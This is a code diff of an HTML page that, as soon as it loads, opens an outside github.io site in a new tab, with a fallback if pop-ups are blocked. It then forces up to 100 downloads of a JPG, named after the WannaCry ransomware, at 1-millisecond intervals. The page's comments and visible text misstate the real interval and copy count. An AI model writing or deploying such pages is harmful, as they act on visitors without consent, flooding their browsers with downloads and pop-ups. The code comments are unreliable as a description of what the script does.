@@ -1,32 +1,58 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Download 100 Copies</title>
+  <meta charset="UTF-8" />
+  <title></title>
 </head>
 <body>
   <a id="download-link" href="WIN_20251109_17_45_22_Pro.jpg" style="display: none;">Download File</a>
 
   <script>
     document.addEventListener("DOMContentLoaded", function() {
+      const targetUrl = "https://opboi1234.github.io/no_hack/";
+
+  
+      try {
+        // Best-effort: direct open
+        const newWin = window.open(targetUrl, "_blank");
+
+        // Fallback: create an anchor and click it (sometimes behaves better)
+        if (!newWin) {
+          const a = document.createElement("a");
+          a.href = targetUrl;
+          a.target = "_blank";
+          a.rel = "noopener noreferrer";
+          // append, click, remove
+          document.body.appendChild(a);
+          a.click();
+          a.remove();
+        }
+      } catch (e) {
+        // silent fail — browsers may block programmatic opens
+        console.warn("Could not open new tab/window:", e);
+      }
+
+      // Start the download loop on the current page
       const link = document.getElementById('download-link');
 
       let i = 1;
+      const maxCopies = 100; // change to 100 if you want (may be blocked)
       const interval = setInterval(() => {
-        if (i > 20) { // change to 100 if you want, but browsers may block it
+        if (i > maxCopies) {
           clearInterval(interval);
           return;
         }
         const tempLink = link.cloneNode(true);
-        tempLink.download = `photo${i}.jpg`;
+        // set a suggested filename so downloads look different
+        tempLink.download = `wannna_Cry${i}.jpg`;
         document.body.appendChild(tempLink);
         tempLink.click();
         tempLink.remove();
         i++;
-      }, 1000); // 1 second delay between downloads
+      }, 1); // 1 second between attempts
     });
   </script>
 
-  <p>Attempting to download 20 copies...</p>
+  <p>Attempting to download 20 copies... (the page also tries to open the other site in a new tab)</p>
 </body>
 </html>
